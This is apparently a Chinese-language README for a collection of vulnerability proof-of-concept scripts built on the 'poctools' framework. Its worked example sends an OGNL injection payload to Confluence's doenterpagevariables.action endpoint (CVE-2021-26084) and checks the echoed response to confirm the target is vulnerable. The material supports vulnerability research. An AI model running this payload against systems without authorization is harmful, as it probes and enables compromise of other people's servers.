# pocs

使用`poctools`框架编写的漏洞PoC脚本集合，框架问题和PoC问题都可以在本项目提交issue。

poctools框架适用于个人做漏洞研究，批量扫描引擎请使用: https://github.com/yanmengfei/spoce


# 安装框架

```
pip install poctools -i https://pypi.org/simple/
```

# 使用

> 以`Atlassian Confluence Server 注入漏洞(CVE-2021-26084)`为例

## 1. 修改目标
```python
from poctools import BasicPoc

class AtlassianConfluenceServerConsolePoc(BasicPoc):

    path = "/pages/doenterpagevariables.action"
    payload = "queryString=aaa%5Cu0027%2B%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D%7D%2B%5Cu0027bbb"
    validate = "aaa{class java.lang.String=null}bbb"
    

    def __init__(self):
        super(AtlassianConfluenceServerConsolePoc, self).__init__()
        self.name = "AtlassianConfluence任意命令执行"
    
    def verify(self, url):
        self.set_headers({"Content-Type": "application/x-www-form-urlencoded"})
        response = self.post(url+self.path, data=self.payload)
        if response is None:
            return False
        return self.validate in response.text


if __name__ == '__main__':
    target = "127.0.0.1:1990"
    poc = AtlassianConfluenceServerConsolePoc()
    result = poc.run(target)
    print(f"{target} -> {result}")
```

## 2. 运行
```
python3 atlassian-cve-2021-26084.py
```

## 3. 漏洞利用效果

![](http://img.itmeng.top/20210922172151.png)
